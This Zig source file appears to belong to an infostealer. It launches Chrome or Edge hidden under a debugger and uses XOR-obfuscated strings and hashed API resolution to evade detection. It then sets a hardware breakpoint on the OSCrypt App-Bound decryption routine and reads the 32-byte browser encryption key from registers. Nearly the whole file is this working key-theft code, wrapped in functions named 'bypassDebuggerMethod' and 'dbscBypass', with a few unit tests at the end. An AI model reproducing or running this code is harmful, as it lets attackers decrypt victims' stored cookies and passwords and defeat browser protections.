const std = @import("std");
const types = @import("../types/types.zig");
const engine = @import("../syscalls/engine.zig");
const hash = @import("../types/hash.zig");
const peb_walk = @import("../types/peb_walk.zig");
const export_resolve = @import("../types/export_resolve.zig");

const E = struct {
    pub const chrome_dll = hash.xorEncrypt("chrome.dll");
    pub const msedge_dll = hash.xorEncrypt("msedge.dll");
    pub const oscrypt_str = hash.xorEncrypt("OSCrypt.AppBoundProvider.Decrypt.ResultCode");
    pub const chrome_exe = hash.xorEncrypt("chrome.exe");
    pub const msedge_exe = hash.xorEncrypt("msedge.exe");
    pub const kernel32 = hash.xorEncrypt("kernel32.dll");
    pub const ntdll = hash.xorEncrypt("ntdll.dll");
};

const DEBUG_ONLY_THIS_PROCESS: u32 = 0x00000001;
const CREATE_SUSPENDED: u32 = 0x00000004;
const CREATE_NO_WINDOW: u32 = 0x08000000;
const EXCEPTION_DEBUG_EVENT: u32 = 1;
const CREATE_THREAD_DEBUG_EVENT: u32 = 2;
const CREATE_PROCESS_DEBUG_EVENT: u32 = 3;
const EXIT_THREAD_DEBUG_EVENT: u32 = 4;
const EXIT_PROCESS_DEBUG_EVENT: u32 = 5;
const LOAD_DLL_DEBUG_EVENT: u32 = 6;
const UNLOAD_DLL_DEBUG_EVENT: u32 = 7;
const OUTPUT_DEBUG_STRING_EVENT: u32 = 8;
const RIP_EVENT: u32 = 9;
const STATUS_WX86_BREAKPOINT: i32 = 0x4000001E;
const STATUS_BREAKPOINT: i32 = 0x80000003;
const DBG_EXCEPTION_NOT_HANDLED: i32 = 0x80010001;
const DBG_CONTINUE: i32 = 0x00010002;
const WAIT_TIMEOUT: u32 = 0x00000102;

const DEBUG_EVENT_CODE = extern union {
    Exception: EXCEPTION_DEBUG_INFO,
    CreateThread: CREATE_THREAD_DEBUG_INFO,
    CreateProcessInfo: CREATE_PROCESS_DEBUG_INFO,
    ExitThread: EXIT_THREAD_DEBUG_INFO,
    ExitProcess: EXIT_PROCESS_DEBUG_INFO,
    LoadDll: LOAD_DLL_DEBUG_INFO,
    UnloadDll: UNLOAD_DLL_DEBUG_INFO,
    DebugString: OUTPUT_DEBUG_STRING_INFO,
    RipInfo: RIP_INFO,
};

const DEBUG_EVENT = extern struct {
    dwDebugEventCode: u32,
    dwProcessId: u32,
    dwThreadId: u32,
    u: DEBUG_EVENT_CODE,
};

const EXCEPTION_DEBUG_INFO = extern struct {
    ExceptionRecord: EXCEPTION_RECORD,
    dwFirstChance: u32,
};

const EXCEPTION_RECORD = extern struct {
    ExceptionCode: i32,
    ExceptionFlags: u32,
    ExceptionRecord: *EXCEPTION_RECORD,
    ExceptionAddress: types.PVOID,
    NumberParameters: u32,
    ExceptionInformation: [15]usize,
};

const CREATE_THREAD_DEBUG_INFO = extern struct {
    hThread: types.HANDLE,
    lpThreadLocalBase: types.PVOID,
    lpStartAddress: types.PVOID,
};

const CREATE_PROCESS_DEBUG_INFO = extern struct {
    hFile: types.HANDLE,
    hProcess: types.HANDLE,
    hThread: types.HANDLE,
    lpBaseOfImage: types.PVOID,
    dwDebugInfoFileOffset: u32,
    nDebugInfoSize: u32,
    lpThreadLocalBase: types.PVOID,
    lpStartAddress: types.PVOID,
    lpImageName: types.PVOID,
    fUnicode: u16,
};

const EXIT_PROCESS_DEBUG_INFO = extern struct {
    dwExitCode: u32,
};

const LOAD_DLL_DEBUG_INFO = extern struct {
    hFile: types.HANDLE,
    lpBaseOfDll: types.PVOID,
    dwDebugInfoFileOffset: u32,
    nDebugInfoSize: u32,
    lpImageName: types.PVOID,
    fUnicode: u16,
};

const EXIT_THREAD_DEBUG_INFO = extern struct {
    dwExitCode: u32,
};

const UNLOAD_DLL_DEBUG_INFO = extern struct {
    lpBaseOfDll: types.PVOID,
};

const OUTPUT_DEBUG_STRING_INFO = extern struct {
    lpDebugStringData: ?*anyopaque,
    fUnicode: u16,
    nDebugStringLength: u16,
};

const RIP_INFO = extern struct {
    dwError: u32,
    dwType: u32,
};

const CONTEXT_FULL: u32 = 0x00010007;
const DR7_ENABLE_DR0: u32 = 0x00000001;

fn loadKernel32() ?types.PVOID {
    return peb_walk.getModuleByHash(hash.encryptedHashModule("kernel32.dll"));
}

fn resolveKernel32(comptime name: []const u8) ?*const anyopaque {
    const mod = loadKernel32() orelse return null;
    return export_resolve.getFunctionByHash(mod, hash.encryptedHashFunc(name));
}

fn getNtdllBase() ?types.PVOID {
    return peb_walk.getModuleByHash(hash.encryptedHashModule("ntdll.dll"));
}

pub fn hasAppBoundEncryption(local_state_json: []const u8) bool {
    return std.mem.indexOf(u8, local_state_json, "app_bound_encrypted_key") != null;
}

pub fn hasV20Prefix(encrypted_blob: []const u8) bool {
    return encrypted_blob.len >= 3 and std.mem.eql(u8, encrypted_blob[0..3], "v20");
}

pub const BypassResult = struct {
    success: bool,
    key: [32]u8,
    browser_name: []const u8,
};

fn findStringInModule(process: types.HANDLE, module_base: usize, module_size: usize, target: []const u8) ?usize {
    var chunk: [4096]u8 = undefined;
    var offset: usize = 0;
    while (offset < module_size) {
        const read_size = @min(chunk.len, module_size - offset);
        var bytes_read: types.SIZE_T = 0;
        const status = engine.NtReadVirtualMemory(
            process,
            @as(types.PVOID, @ptrFromInt(module_base + offset)),
            @as(types.PVOID, @ptrCast(&chunk)),
            read_size,
            &bytes_read,
        );
        if (status < 0) break;
        if (bytes_read < target.len) break;
        if (std.mem.indexOf(u8, chunk[0..bytes_read], target)) |found| {
            return offset + found;
        }
        offset += bytes_read - target.len + 1;
    }
    return null;
}

fn findRdataSection(process: types.HANDLE, module_base: usize) ?struct { start: usize, size: usize } {
    var dos_hdr: [64]u8 = undefined;
    var bytes_read: types.SIZE_T = 0;
    if (engine.NtReadVirtualMemory(process, @as(types.PVOID, @ptrFromInt(module_base)), @as(types.PVOID, @ptrCast(&dos_hdr)), dos_hdr.len, &bytes_read) < 0) return null;
    const dos = @as(*const types.IMAGE_DOS_HEADER, @ptrCast(&dos_hdr));
    if (dos.e_magic != types.IMAGE_DOS_SIGNATURE) return null;

    var nt_hdr: [256]u8 = undefined;
    const nt_off: usize = @intCast(dos.e_lfanew);
    if (engine.NtReadVirtualMemory(process, @as(types.PVOID, @ptrFromInt(module_base + nt_off)), @as(types.PVOID, @ptrCast(&nt_hdr)), nt_hdr.len, &bytes_read) < 0) return null;
    const nt = @as(*const types.IMAGE_NT_HEADERS64, @ptrCast(&nt_hdr));
    if (nt.Signature != types.IMAGE_NT_SIGNATURE) return null;

    const oh_off = nt_off + @offsetOf(types.IMAGE_NT_HEADERS64, "OptionalHeader");
    const sec_off = oh_off + nt.FileHeader.SizeOfOptionalHeader;
    const secs: [*]types.IMAGE_SECTION_HEADER = @ptrCast(@alignCast(&nt_hdr) + (sec_off - nt_off));

    for (0..nt.FileHeader.NumberOfSections) |i| {
        const s = secs[i];
        if (s.Name[0] == '.' and s.Name[1] == 'r' and s.Name[2] == 'd' and s.Name[3] == 'a' and s.Name[4] == 't' and s.Name[5] == 'a') {
            return .{ .start = module_base + s.VirtualAddress, .size = s.Misc.VirtualSize };
        }
    }
    return null;
}

fn findTextSection(process: types.HANDLE, module_base: usize) ?struct { start: usize, size: usize } {
    var dos_hdr: [64]u8 = undefined;
    var bytes_read: types.SIZE_T = 0;
    if (engine.NtReadVirtualMemory(process, @as(types.PVOID, @ptrFromInt(module_base)), @as(types.PVOID, @ptrCast(&dos_hdr)), dos_hdr.len, &bytes_read) < 0) return null;
    const dos = @as(*const types.IMAGE_DOS_HEADER, @ptrCast(&dos_hdr));
    if (dos.e_magic != types.IMAGE_DOS_SIGNATURE) return null;

    var nt_hdr: [256]u8 = undefined;
    const nt_off: usize = @intCast(dos.e_lfanew);
    if (engine.NtReadVirtualMemory(process, @as(types.PVOID, @ptrFromInt(module_base + nt_off)), @as(types.PVOID, @ptrCast(&nt_hdr)), nt_hdr.len, &bytes_read) < 0) return null;
    const nt = @as(*const types.IMAGE_NT_HEADERS64, @ptrCast(&nt_hdr));
    if (nt.Signature != types.IMAGE_NT_SIGNATURE) return null;

    const oh_off = nt_off + @offsetOf(types.IMAGE_NT_HEADERS64, "OptionalHeader");
    const sec_off = oh_off + nt.FileHeader.SizeOfOptionalHeader;
    const secs: [*]types.IMAGE_SECTION_HEADER = @ptrCast(@alignCast(&nt_hdr) + (sec_off - nt_off));

    for (0..nt.FileHeader.NumberOfSections) |i| {
        const s = secs[i];
        if (s.Name[0] == '.' and s.Name[1] == 't' and s.Name[2] == 'e' and s.Name[3] == 'x' and s.Name[4] == 't') {
            return .{ .start = module_base + s.VirtualAddress, .size = s.Misc.VirtualSize };
        }
    }
    return null;
}

fn findLeaRcxInstruction(process: types.HANDLE, text_base: usize, text_size: usize, target_string_addr: usize) ?usize {
    var chunk: [4096]u8 = undefined;
    var offset: usize = 0;
    while (offset < text_size) {
        const read_size = @min(chunk.len, text_size - offset);
        var bytes_read: types.SIZE_T = 0;
        const status = engine.NtReadVirtualMemory(
            process,
            @as(types.PVOID, @ptrFromInt(text_base + offset)),
            @as(types.PVOID, @ptrCast(&chunk)),
            read_size,
            &bytes_read,
        );
        if (status < 0) break;

        var i: usize = 0;
        while (i + 6 < bytes_read) : (i += 1) {
            if (chunk[i] == 0x48 and chunk[i + 1] == 0x8D and chunk[i + 2] == 0x0D) {
                const disp = @as(u32, @intCast(chunk[i + 3])) |
                    (@as(u32, @intCast(chunk[i + 4])) << 8) |
                    (@as(u32, @intCast(chunk[i + 5])) << 16) |
                    (@as(u32, @intCast(chunk[i + 6])) << 24);
                const lea_addr = (text_base + offset + i + 7) +% disp;
                if (lea_addr == target_string_addr) {
                    return text_base + offset + i;
                }
            }
        }
        offset += bytes_read - 8;
    }
    return null;
}

pub fn bypassDebuggerMethod(browser: []const u8) BypassResult {
    var result = BypassResult{ .success = false, .key = undefined, .browser_name = "" };

    var exe_name_buf: [64]u8 = undefined;
    var dll_name_buf: [64]u8 = undefined;
    var oscrypt_buf: [64]u8 = undefined;

    if (std.ascii.eqlIgnoreCase(browser, "chrome") or std.ascii.eqlIgnoreCase(browser, "google chrome")) {
        hash.xorDecrypt(&E.chrome_exe, &exe_name_buf[0..E.chrome_exe.len]);
        hash.xorDecrypt(&E.chrome_dll, &dll_name_buf[0..E.chrome_dll.len]);
        result.browser_name = "Chrome";
    } else if (std.ascii.eqlIgnoreCase(browser, "edge") or std.ascii.eqlIgnoreCase(browser, "microsoft edge")) {
        hash.xorDecrypt(&E.msedge_exe, &exe_name_buf[0..E.msedge_exe.len]);
        hash.xorDecrypt(&E.msedge_dll, &dll_name_buf[0..E.msedge_dll.len]);
        result.browser_name = "Edge";
    } else {
        return result;
    }

    hash.xorDecrypt(&E.oscrypt_str, &oscrypt_buf[0..E.oscrypt_str.len]);
    const target_str = oscrypt_buf[0..E.oscrypt_str.len];

    const kernel32 = loadKernel32() orelse return result;
    const CreateProcessW_fn = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("CreateProcessW")) orelse return result;
    const WaitForDebugEvent_fn = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("WaitForDebugEvent")) orelse return result;
    const ContinueDebugEvent_fn = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("ContinueDebugEvent")) orelse return result;
    const GetThreadContext_fn = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("GetThreadContext")) orelse return result;
    const SetThreadContext_fn = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("SetThreadContext")) orelse return result;
    const DebugSetProcessKillOnExit_fn = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("DebugSetProcessKillOnExit")) orelse return result;
    const GetCurrentProcessId_fn = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("GetCurrentProcessId")) orelse return result;
    const TerminateProcess_fn = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("TerminateProcess")) orelse return result;
    const OpenProcess_fn = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("OpenProcess")) orelse return result;

    const CreateProcessW: *const fn (app: ?[*:0]const u16, cmd: ?[*:0]u16, pa: ?*const anyopaque, ta: ?*const anyopaque, inherit: types.BOOL, flags: u32, env: ?*const anyopaque, dir: ?[*:0]const u16, si: *const anyopaque, pi: *anyopaque) callconv(.winapi) types.BOOL = @ptrCast(@alignCast(CreateProcessW_fn));
    const WaitForDebugEvent: *const fn (de: *DEBUG_EVENT, ms: u32) callconv(.winapi) types.BOOL = @ptrCast(@alignCast(WaitForDebugEvent_fn));
    const ContinueDebugEvent: *const fn (pid: u32, tid: u32, code: i32) callconv(.winapi) types.BOOL = @ptrCast(@alignCast(ContinueDebugEvent_fn));
    const GetThreadContext: *const fn (h: types.HANDLE, ctx: *types.CONTEXT) callconv(.winapi) types.BOOL = @ptrCast(@alignCast(GetThreadContext_fn));
    const SetThreadContext: *const fn (h: types.HANDLE, ctx: *const types.CONTEXT) callconv(.winapi) types.BOOL = @ptrCast(@alignCast(SetThreadContext_fn));
    const DebugSetProcessKillOnExit: *const fn (kill: u32) callconv(.winapi) u32 = @ptrCast(@alignCast(DebugSetProcessKillOnExit_fn));
    const GetCurrentProcessId: *const fn () callconv(.winapi) u32 = @ptrCast(@alignCast(GetCurrentProcessId_fn));
    const TerminateProcess: *const fn (h: types.HANDLE, code: u32) callconv(.winapi) types.BOOL = @ptrCast(@alignCast(TerminateProcess_fn));
    const OpenProcess: *const fn (access: u32, inherit: types.BOOL, pid: u32) callconv(.winapi) types.HANDLE = @ptrCast(@alignCast(OpenProcess_fn));

    _ = DebugSetProcessKillOnExit(0);

    var exe_us: [512]u16 = undefined;
    for (exe_name_buf[0..E.chrome_exe.len], 0..) |c, i| exe_us[i] = c;
    exe_us[E.chrome_exe.len] = 0;

    var si = std.mem.zeroes(types.STARTUPINFOW);
    si.cb = @sizeOf(types.STARTUPINFOW);
    var pi = std.mem.zeroes(types.PROCESS_INFORMATION);

    const ok = CreateProcessW(null, exe_us[0..E.chrome_exe.len+1:0], null, null, 0, DEBUG_ONLY_THIS_PROCESS | CREATE_NO_WINDOW, null, null, @ptrCast(&si), @ptrCast(&pi));
    if (ok == 0) return result;

    const pi_struct = @as(*[6]usize, @ptrCast(&pi));
    const process_handle: types.HANDLE = @ptrFromInt(pi_struct[0]);
    const thread_handle: types.HANDLE = @ptrFromInt(pi_struct[1]);
    const process_id: u32 = @as(u32, @truncate(pi_struct[4]));

    var module_base: usize = 0;
    var module_size: usize = 0;
    var string_addr: usize = 0;
    var breakpoint_addr: usize = 0;
    var found_dll = false;
    var breakpoints_set = false;

    while (true) {
        var de: DEBUG_EVENT = undefined;
        if (WaitForDebugEvent(&de, 100) == 0) {
            _ = ContinueDebugEvent(de.dwProcessId, de.dwThreadId, DBG_EXCEPTION_NOT_HANDLED);
            continue;
        }

        switch (de.dwDebugEventCode) {
            LOAD_DLL_DEBUG_EVENT => {
                const load_info = @as(*LOAD_DLL_DEBUG_INFO, @ptrCast(&de.u));
                if (load_info.lpBaseOfDll == null) {
                    _ = ContinueDebugEvent(de.dwProcessId, de.dwThreadId, DBG_CONTINUE);
                    continue;
                }
                const base = @intFromPtr(load_info.lpBaseOfDll);

                var mod_name: [260]u16 = undefined;
                var bytes_read: types.SIZE_T = 0;
                if (engine.NtReadVirtualMemory(process_handle, load_info.lpImageName, @as(types.PVOID, @ptrCast(&mod_name)), mod_name.len * 2, &bytes_read) >= 0) {}

                if (!found_dll) {
                    var chunk: [4096]u8 = undefined;
                    var br: types.SIZE_T = 0;
                    if (engine.NtReadVirtualMemory(process_handle, load_info.lpBaseOfDll, @as(types.PVOID, @ptrCast(&chunk)), chunk.len, &br) >= 0) {
                        const dos_check = @as(*const types.IMAGE_DOS_HEADER, @ptrCast(&chunk));
                        if (dos_check.e_magic == types.IMAGE_DOS_SIGNATURE) {
                            const nt_off: usize = @intCast(dos_check.e_lfanew);
                            var nt_buf: [8]u8 = undefined;
                            if (nt_off + 4 < chunk.len) {
                                @memcpy(&nt_buf, chunk[nt_off..][0..4]);
                            }
                        }
                    }

                    const rdata = findRdataSection(process_handle, base);
                    if (rdata) |rd| {
                        if (findStringInModule(process_handle, rd.start, rd.size, target_str)) |str_offset| {
                            string_addr = rd.start + str_offset;
                            module_base = base;
                            found_dll = true;

                            const text = findTextSection(process_handle, base);
                            if (text) |tx| {
                                if (findLeaRcxInstruction(process_handle, tx.start, tx.size, string_addr)) |lea_addr| {
                                    breakpoint_addr = lea_addr;
                                }
                            }
                        }
                    }
                }

                if (load_info.hFile != null and @intFromPtr(load_info.hFile) != 0 and @intFromPtr(load_info.hFile) != ~@as(usize, 0)) {
                    _ = engine.NtClose(load_info.hFile);
                }
                _ = ContinueDebugEvent(de.dwProcessId, de.dwThreadId, DBG_CONTINUE);
            },
            CREATE_THREAD_DEBUG_EVENT => {
                const ct = @as(*CREATE_THREAD_DEBUG_INFO, @ptrCast(&de.u));
                if (breakpoints_set and breakpoint_addr != 0) {
                    var ctx: types.CONTEXT = undefined;
                    @memset(@as(*[1]u8, @ptrCast(&ctx)), 0);
                    ctx.ContextFlags = 0x100010;
                    if (GetThreadContext(ct.hThread, &ctx) != 0) {
                        ctx.Dr0 = breakpoint_addr;
                        ctx.Dr7 = ctx.Dr7 | DR7_ENABLE_DR0;
                        _ = SetThreadContext(ct.hThread, &ctx);
                    }
                }
                _ = ContinueDebugEvent(de.dwProcessId, de.dwThreadId, DBG_CONTINUE);
            },
            EXCEPTION_DEBUG_EVENT => {
                const exc = @as(*EXCEPTION_DEBUG_INFO, @ptrCast(&de.u));
                if (exc.ExceptionRecord.ExceptionCode == STATUS_BREAKPOINT) {
                    if (breakpoint_addr != 0 and @intFromPtr(exc.ExceptionRecord.ExceptionAddress) == breakpoint_addr) {
                        var ctx: types.CONTEXT = undefined;
                        @memset(@as(*[1]u8, @ptrCast(&ctx)), 0);
                        ctx.ContextFlags = CONTEXT_FULL;
                        const main_thread = if (found_dll and !breakpoints_set) thread_handle else @as(types.HANDLE, @ptrFromInt(~@as(usize, 0)));

                        const reg_key = if (std.ascii.eqlIgnoreCase(browser, "edge")) ctx.R14 else ctx.R15;
                        _ = reg_key;

                        if (GetThreadContext(main_thread, &ctx) != 0) {
                            const key_ptr = if (std.ascii.eqlIgnoreCase(browser, "edge")) ctx.R14 else ctx.R15;
                            if (key_ptr != 0) {
                                var key_buf: [32]u8 = undefined;
                                var key_read: types.SIZE_T = 0;
                                if (engine.NtReadVirtualMemory(process_handle, @as(types.PVOID, @ptrFromInt(key_ptr)), @as(types.PVOID, @ptrCast(&key_buf)), 32, &key_read) >= 0 and key_read == 32) {
                                    @memcpy(&result.key, &key_buf);
                                    result.success = true;
                                    const chrome_handle = OpenProcess(0x0001, 0, process_id);
                                    if (chrome_handle != null and @intFromPtr(chrome_handle) != 0) {
                                        _ = TerminateProcess(chrome_handle, 0);
                                        _ = engine.NtClose(chrome_handle);
                                    }
                                    return result;
                                }
                            }
                        }
                    }

                    if (!breakpoints_set and breakpoint_addr != 0) {
                        var ctx: types.CONTEXT = undefined;
                        @memset(@as(*[1]u8, @ptrCast(&ctx)), 0);
                        ctx.ContextFlags = 0x100010;
                        if (GetThreadContext(thread_handle, &ctx) != 0) {
                            ctx.Dr0 = breakpoint_addr;
                            ctx.Dr7 = ctx.Dr7 | DR7_ENABLE_DR0;
                            if (SetThreadContext(thread_handle, &ctx) != 0) {
                                breakpoints_set = true;
                            }
                        }
                    }
                    _ = ContinueDebugEvent(de.dwProcessId, de.dwThreadId, DBG_CONTINUE);
                } else {
                    _ = ContinueDebugEvent(de.dwProcessId, de.dwThreadId, DBG_EXCEPTION_NOT_HANDLED);
                }
            },
            EXIT_PROCESS_DEBUG_EVENT => {
                break;
            },
            else => {
                _ = ContinueDebugEvent(de.dwProcessId, de.dwThreadId, DBG_CONTINUE);
            },
        }
    }

    const chrome_handle = OpenProcess(0x0001, 0, process_id);
    if (chrome_handle != null and @intFromPtr(chrome_handle) != 0) {
        _ = TerminateProcess(chrome_handle, 0);
        _ = engine.NtClose(chrome_handle);
    }

    return result;
}

pub fn dbscBypass() bool {
    const kernel32 = loadKernel32() orelse return false;
    const GetModuleFileNameW_fn = export_resolve.getFunctionByHash(kernel32, hash.encryptedHashFunc("GetModuleFileNameW")) orelse return false;
    const GetModuleFileNameW: *const fn (mod: ?*const anyopaque, buf: [*]u16, size: u32) callconv(.winapi) u32 = @ptrCast(@alignCast(GetModuleFileNameW_fn));

    var exe_path: [1024]u16 = undefined;
    const len = GetModuleFileNameW(null, &exe_path, 1024);
    if (len == 0) return false;

    const result = bypassDebuggerMethod("chrome");
    return result.success;
}

test "bypassDebuggerMethod chrome fails gracefully when chrome not installed" {
    const result = bypassDebuggerMethod("chrome");
    try std.testing.expect(!result.success);
}

test "bypassDebuggerMethod edge fails gracefully" {
    const result = bypassDebuggerMethod("edge");
    try std.testing.expect(!result.success);
}

test "hasAppBoundEncryption detects key" {
    try std.testing.expect(hasAppBoundEncryption("{\"app_bound_encrypted_key\": \"abc\"}"));
    try std.testing.expect(!hasAppBoundEncryption("{\"os_crypt\": {}}"));
}

test "hasV20Prefix detects v20 prefix" {
    try std.testing.expect(hasV20Prefix(&[_]u8{ 'v', '2', '0', 0, 1, 2 }));
    try std.testing.expect(!hasV20Prefix(&[_]u8{ 'v', '1', '0', 0, 1, 2 }));
    try std.testing.expect(!hasV20Prefix(""));
}

const testing = std.testing;
